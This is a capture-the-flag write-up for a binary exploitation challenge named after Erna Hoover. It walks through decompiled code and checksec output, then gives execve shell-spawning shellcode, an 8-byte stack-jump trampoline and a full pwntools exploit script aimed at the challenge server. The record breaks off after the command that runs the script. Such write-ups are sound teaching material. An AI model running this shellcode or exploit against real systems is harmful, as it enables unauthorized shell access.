## Erna Hoover

> [Erna Schneider Hoover](https://en.wikipedia.org/wiki/Erna_Schneider_Hoover) (born June 19, 1926) is an American mathematician notable for inventing a computerized telephone switching method which "revolutionized modern communication". It prevented system overloads by monitoring call center traffic and prioritizing tasks on phone switching systems to enable more robust service during peak calling times. At Bell Laboratories where she worked for over 32 years, Hoover was described as an important pioneer for women in the field of computer technology. - [Wikipedia Entry](https://en.wikipedia.org/wiki/Erna_Schneider_Hoover)

## Solution
We get a binary to exploit for this challenge. Lets see what's in it?

```c
undefined8 main(void)
{
  size_t sVar1;
  char local_58 [64];
  ssize_t local_18;
  code *local_10;
  
  logo();
  printf("\x1b[38;5;161m Enter Username >>> ");
  fgets(local_58,0x32,stdin);
  sVar1 = strcspn(local_58,"\n");
  local_58[sVar1] = '\0';
  printf("\x1b[38;5;161m Greetings, %s! You get 8 bytes of shellcode >>> \n",local_58);
  local_10 = (code *)mmap((void *)0x88880000,0x1000,7,0x32,-1,0);
  local_18 = read(0,local_10,8);
  (*local_10)();
  return 0;
}
```

We can enter `50` bytes as a username. There is no overflow here, since the buffer is at least `64` bytes long. After this we can enter `8` more bytes which are then written to executable memory and run. As the comment states, we have 8 bytes of shellcode we can use. Thats not a lot, but lets see what we can do.

Checking the binary with `checksec` we see that basialy all security measurements are disabled. But the best thing for us here is that stack memory is executable. Knowing this we have a lot more space to inject shellcode as our username. The *actual* 8 bytes of shellcode need only to jump to the username buffer, that's doable in 8 bytes.

```bash
$ checksec ./chal.bin
[*] '/home/ctf/chal.bin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

To get shell we can for instance use [`this shellcode`](https://shell-storm.org/shellcode/files/shellcode-806.html)

```asm
  xor eax, eax
  mov rbx, 0xFF978CD091969DD1
  neg rbx
  push rbx
  push rsp
  pop rdi
  cdq
  push rdx
  push rdi
  push rsp
  pop rsi
  mov al, 0x3b
  syscall
```

Having this on the stack we only need to know where to jump to. When inspecting with `Ghidra` or `gdb` we see the buffer is `120` bytes from `rsp` when the trampoline shellcode is executed (before the call `buffer address - rsp = 112` bytes plus 8 bytes return address for the call to our shellcode). So we can use `rsp` as reference to jump to our buffer.

```
  add rsp, 120
  jmp rsp
```

The full exploit then looks something like this:

```
from pwn import *

#context.log_level = "DEBUG"
context.arch = "amd64"

#p = process("./chal.bin")
p = remote("0.cloud.chals.io", 28184)

payload1 = asm('''
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
''')

payload2 = asm('''
        add rsp, 120
        jmp rsp
''')

p.sendline(payload1)
p.sendlineafter(b"shellcode >>> \n", payload2)
p.interactive()
```

Running this gives us shell on the remote machine and we can just cat the flag.

```bash
$ python solve.py
